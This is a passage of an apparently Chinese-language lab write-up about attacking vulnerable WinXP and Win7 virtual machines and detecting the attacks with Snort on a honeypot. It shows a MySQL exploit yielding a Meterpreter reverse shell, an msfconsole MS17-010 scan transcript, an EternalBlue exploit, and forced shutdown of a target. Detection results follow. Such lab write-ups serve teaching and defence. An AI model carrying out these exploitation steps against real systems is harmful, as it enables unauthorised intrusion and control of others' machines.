<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766975491.png" alt="1565766975491"></p>
<p>设置用户名<code>root</code>, 密码<code>root</code>，<code>RHOSTS</code>为目标机<code>192.168.43.213</code>，<code>LHOST</code>监听主机为攻击机<code>192.168.43.247</code>，<code>LHOST</code>监听端口为<code>5012</code>，攻击漏洞虚拟机<code>192.168.43.213</code>，成功<code>getshell</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767036734.png" alt="1565767036734"></p>
<p>命令行如下，打开了<code>Meterpreter session</code>:</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767058474.png" alt="1565767058474"></p>
<p><code>getshell</code>之后，写入文件夹到C盘。在<code>winXP</code>漏洞机上发现了新文件夹</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767090009.png" alt="1565767090009"></p>
<p>最后让被<code>getshell</code>的漏洞机关机：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767122319.png" alt="1565767122319"></p>
<p>windows被迫关机 </p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767134174.png" alt="1565767134174"></p>
</li>
</ol>
<h3 id="对win-7漏洞机攻击"><a href="#对win-7漏洞机攻击" class="headerlink" title="对win 7漏洞机攻击"></a>对<code>win 7</code>漏洞机攻击</h3><ol>
<li><p>选择局域网中的第一台真机<code>192.168.43.59</code>，扫描该IP端口，如下图所示，可以发现<code>135</code>、<code>139</code>、<code>445</code>等端口开放。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767256750.png" alt="1565767256750"></p>
<p><code>nmap</code>扫描到该主机的<code>445</code>端口开放，用永恒之蓝模块检测</p>
</li>
<li><p>使用<code>smb_ms17_010</code>对漏洞机进行检测，设置目标主机为<code>192.168.43.59</code>，检测到<code>Host is likely VULNERABLE to MS17-010</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.43.59</span><br><span class="line">rhosts =&gt; 192.168.43.59</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 192.168.43.59:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.43.59:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767344496.png" alt="1565767344496"></p>
<p>扫描确认存在永恒之蓝漏洞</p>
</li>
<li><p>获取控制权，使用<code>ms17_010_eternalblue</code>模块<code>getshell</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767393800.png" alt="1565767393800"></p>
<p>添加文件</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767407235.png" alt="1565767407235"></p>
<p>在漏洞主机上发现了新建的文件夹</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767425902.png" alt="1565767425902"></p>
</li>
<li><p>图形界面渗透成功图示</p>
<p><code>192.168.43.59</code>为部署<code>永恒之蓝</code>漏洞的<code>win7</code>虚拟机，<code>192.168.43.213</code>为部署<code>mysql</code>漏洞的<code>winXP</code>虚拟机</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767471994.png" alt="1565767471994"></p>
<p><code>mysql</code>提权漏洞获得<code>shell</code>之后，可以取得<code>screenshot</code>屏幕截图</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767498529.png" alt="1565767498529"></p>
</li>
</ol>
<h2 id="snort检测"><a href="#snort检测" class="headerlink" title="snort检测"></a>snort检测</h2><h3 id="AWVS扫描检测"><a href="#AWVS扫描检测" class="headerlink" title="AWVS扫描检测"></a><code>AWVS</code>扫描检测</h3><p>攻击机kali使用<code>AWVS</code>扫描蜜罐虚拟机<code>192.168.43.154</code>的<code>80</code>端口</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767586483.png" alt="1565767586483"></p>
<p>浏览器URL输入<code>http://localhost/acid/acid_db_setup.php</code>，即<code>snort网页报告</code>，可以看到检测到扫描</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767619513.png" alt="1565767619513"></p>
<h3 id="NMAP扫描检测"><a href="#NMAP扫描检测" class="headerlink" title="NMAP扫描检测"></a><code>NMAP</code>扫描检测</h3><p>在扫描局域网时，<code>snort</code>检测到<code>nmap</code>扫描，攻击机为<code>192.168.43.247</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767660232.png" alt="1565767660232"></p>
<h3 id="Metasploit渗透攻击检测"><a href="#Metasploit渗透攻击检测" class="headerlink" title="Metasploit渗透攻击检测"></a>Metasploit渗透攻击检测</h3><p><code>445</code>端口检测到攻击<code>NETBIOS SMB-DS Trans Max Param DOS attempt</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767691050.png" alt="1565767691050"></p>
<p>对主机进行端口扫描，其实是使用了<code>nmap</code>工具，检测到<code>nmap ping sweep scan</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767716793.png" alt="1565767716793"></p>
<p>利用<code>SQL提权漏洞</code>进行渗透攻击，<code>Snort</code>检测到<code>MYSQL attack</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767738851.png" alt="1565767738851"></p>
<p>尝试建立<code>Meteroreter</code>会话时，<code>Snort</code>检测到<code>NMAP</code>扫描</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767760977.png" alt="1565767760977"></p>
]]></content>
      <categories>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>Honedy</tag>
        <tag>Snort</tag>
      </tags>
  </entry>
</search>
